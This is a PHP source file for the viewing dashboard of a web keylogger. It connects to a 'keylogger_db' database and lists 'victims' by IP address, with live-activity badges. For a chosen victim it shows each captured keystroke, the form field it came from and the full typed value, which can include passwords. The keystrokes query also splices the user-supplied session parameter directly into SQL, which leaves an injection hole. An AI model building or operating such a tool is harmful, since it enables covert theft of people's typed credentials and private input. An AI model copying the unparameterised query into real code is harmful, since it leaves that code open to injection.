<?php
// view.php - COMPLETE FIXED VERSION
error_reporting(E_ALL);
ini_set('display_errors', 1);

$conn = new mysqli('localhost', 'root', '', 'keylogger_db');

if ($conn->connect_error) {
    die("<div style='color:red; padding:20px;'>❌ Database Connection Failed: " . $conn->connect_error . "</div>");
}

// Get database stats
$db_stats = $conn->query("SELECT 
    (SELECT COUNT(*) FROM victims) as victim_count,
    (SELECT COUNT(*) FROM keystrokes) as keystroke_count,
    (SELECT COUNT(*) FROM victims WHERE last_active > NOW() - INTERVAL 5 MINUTE) as active_count
")->fetch_assoc();

$total_victims = $db_stats['victim_count'] ?? 0;
$total_keys = $db_stats['keystroke_count'] ?? 0;
$active_now = $db_stats['active_count'] ?? 0;

// Get victims
$victims = $conn->query("SELECT * FROM victims ORDER BY last_active DESC");

// Get selected victim
$selected = $_GET['session'] ?? '';
$selected_victim = null;
$keys = null;

if ($selected) {
    $stmt = $conn->prepare("SELECT * FROM victims WHERE session_id = ?");
    $stmt->bind_param("s", $selected);
    $stmt->execute();
    $selected_victim = $stmt->get_result()->fetch_assoc();
    
    $keys = $conn->query("SELECT * FROM keystrokes WHERE session_id = '$selected' ORDER BY timestamp DESC");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Keylogger Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        h1 {
            color: #00ff00;
            margin-bottom: 20px;
            font-size: 32px;
            text-shadow: 0 0 10px rgba(0,255,0,0.3);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
            padding: 25px;
            border-radius: 15px;
            border-left: 5px solid #00ff00;
            box-shadow: 0 5px 20px rgba(0,255,0,0.1);
        }
        
        .stat-card h3 {
            color: #888;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        
        .stat-card .value {
            font-size: 36px;
            font-weight: bold;
            color: #00ff00;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 350px 1fr;
            gap: 20px;
            height: calc(100vh - 200px);
        }
        
        .sidebar {
            background: #1a1a1a;
            border-radius: 15px;
            padding: 20px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        
        .sidebar h2 {
            color: #00ff00;
            font-size: 18px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #333;
        }
        
        .victim-card {
            background: #2a2a2a;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s;
            border-left: 4px solid #444;
        }
        
        .victim-card:hover {
            transform: translateX(-5px);
            background: #3a3a3a;
            border-left-color: #00ff00;
        }
        
        .victim-card.active {
            border-left-color: #00ff00;
            background: #3a3a3a;
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
        }
        
        .victim-card .ip {
            font-weight: bold;
            color: #00ff00;
            font-size: 16px;
        }
        
        .live-badge {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        .main-content {
            background: #1a1a1a;
            border-radius: 15px;
            padding: 20px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        
        .main-content h2 {
            color: #00ff00;
            font-size: 18px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #333;
        }
        
        .log-entry {
            background: #2a2a2a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            border-left: 4px solid #00ff00;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #444;
        }
        
        .timestamp {
            color: #888;
            font-size: 12px;
            font-family: monospace;
        }
        
        .app-badge {
            background: #00ff00;
            color: #000;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .field-name {
            color: #ffaa00;
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .key-pressed {
            background: #333;
            padding: 5px 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 14px;
            display: inline-block;
            margin-bottom: 10px;
        }
        
        .full-value {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            color: #00ff00;
            font-family: monospace;
            word-break: break-all;
            border: 1px solid #333;
            margin-top: 10px;
        }
        
        .search-box {
            width: 100%;
            padding: 12px;
            background: #2a2a2a;
            border: 1px solid #444;
            color: #fff;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .search-box:focus {
            outline: none;
            border-color: #00ff00;
        }
        
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .btn-green {
            background: #00ff00;
            color: #000;
        }
        
        .btn-blue {
            background: #2196F3;
            color: #fff;
        }
        
        .btn-red {
            background: #f44336;
            color: #fff;
        }
        
        .empty-state {
            text-align: center;
            padding: 50px;
            color: #666;
        }
        
        .empty-state h3 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .stats-mini {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 10px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Keylogger Dashboard</h1>
        
        <div class="action-buttons">
            <a href="reset.php" class="btn btn-red" onclick="return confirm('Reset all data?')">Reset Database</a>
            <a href="index.php" class="btn btn-blue" target="_blank">Open Test Page</a>
            <a href="view.php" class="btn btn-green">Refresh</a>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Victims</h3>
                <div class="value"><?php echo $total_victims; ?></div>
            </div>
            <div class="stat-card">
                <h3>Total Keystrokes</h3>
                <div class="value"><?php echo $total_keys; ?></div>
            </div>
            <div class="stat-card">
                <h3>Active Now</h3>
                <div class="value"><?php echo $active_now; ?></div>
            </div>
        </div>
        
        <div class="dashboard">
            <div class="sidebar">
                <h2>👥 Victims List</h2>
                <input type="text" class="search-box" id="searchInput" placeholder="Search by IP or Session...">
                
                <?php if($victims && $victims->num_rows > 0): ?>
                    <?php while($v = $victims->fetch_assoc()): 
                        $is_active = $v['last_active'] && (time() - strtotime($v['last_active'])) < 300;
                    ?>
                    <div class="victim-card <?php echo $selected == $v['session_id'] ? 'active' : ''; ?>" 
                         onclick="location.href='?session=<?php echo urlencode($v['session_id']); ?>'">
                        <div>
                            <?php if($is_active): ?><span class="live-badge"></span><?php endif; ?>
                            <span class="ip"><?php echo htmlspecialchars($v['ip_address'] ?: 'Unknown'); ?></span>
                        </div>
                        <div style="font-size:12px; color:#888; margin-top:8px;">
                            <?php echo substr($v['session_id'], 0, 16); ?>...
                        </div>
                        <div class="stats-mini">
                            <div>First: <?php echo $v['first_seen'] ? date('H:i', strtotime($v['first_seen'])) : '-'; ?></div>
                            <div>Last: <?php echo $v['last_active'] ? date('H:i', strtotime($v['last_active'])) : '-'; ?></div>
                        </div>
                    </div>
                    <?php endwhile; ?>
                <?php else: ?>
                    <div class="empty-state">
                        <h3>😴 No Victims Yet</h3>
                        <p>Click "Open Test Page" to create your first victim</p>
                    </div>
                <?php endif; ?>
            </div>
            
            <div class="main-content">
                <?php if($selected && $selected_victim): ?>
                    <h2>📝 Keystrokes for <?php echo htmlspecialchars($selected_victim['ip_address'] ?: 'Unknown'); ?></h2>
                    
                    <?php if($keys && $keys->num_rows > 0): ?>
                        <?php while($k = $keys->fetch_assoc()): ?>
                        <div class="log-entry">
                            <div class="log-header">
                                <span class="timestamp"><?php echo $k['timestamp']; ?></span>
                                <span class="app-badge"><?php echo htmlspecialchars($k['app_name'] ?: 'Browser'); ?></span>
                            </div>
                            <div class="field-name">
                                📌 Field: <?php echo htmlspecialchars($k['field_name'] ?: 'Unknown'); ?>
                            </div>
                            <div>
                                <span class="key-pressed">⌨️ Key: <?php echo htmlspecialchars($k['key_pressed']); ?></span>
                            </div>
                            <?php if(!empty($k['full_input'])): ?>
                            <div class="full-value">
                                <strong>📋 Full Value:</strong><br>
                                <?php echo nl2br(htmlspecialchars($k['full_input'])); ?>
                            </div>
                            <?php endif; ?>
                        </div>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <div class="empty-state">
                            <h3>⌨️ No Keystrokes Yet</h3>
                            <p>Ask the victim to type something</p>
                        </div>
                    <?php endif; ?>
                    
                <?php elseif($selected): ?>
                    <div class="empty-state">
                        <h3>❌ Victim Not Found</h3>
                        <p>The selected session does not exist</p>
                    </div>
                <?php else: ?>
                    <div class="empty-state">
                        <h3>👈 Select a Victim</h3>
                        <p>Click on any victim from the left panel to view their keystrokes</p>
                    </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    
    <script>
        // Search functionality
        document.getElementById('searchInput').addEventListener('keyup', function() {
            let search = this.value.toLowerCase();
            document.querySelectorAll('.victim-card').forEach(card => {
                let text = card.textContent.toLowerCase();
                card.style.display = text.includes(search) ? 'block' : 'none';
            });
        });
        
        // Auto refresh every 30 seconds
        let refreshTimer = setTimeout(function() {
            location.reload();
        }, 30000);
        
        // Reset timer on user interaction
        document.addEventListener('click', function() {
            clearTimeout(refreshTimer);
            refreshTimer = setTimeout(function() {
                location.reload();
            }, 30000);
        });
        
        // Keyboard shortcut: R to refresh
        document.addEventListener('keydown', function(e) {
            if (e.key === 'r' || e.key === 'R') {
                location.reload();
            }
        });
    </script>
</body>
</html>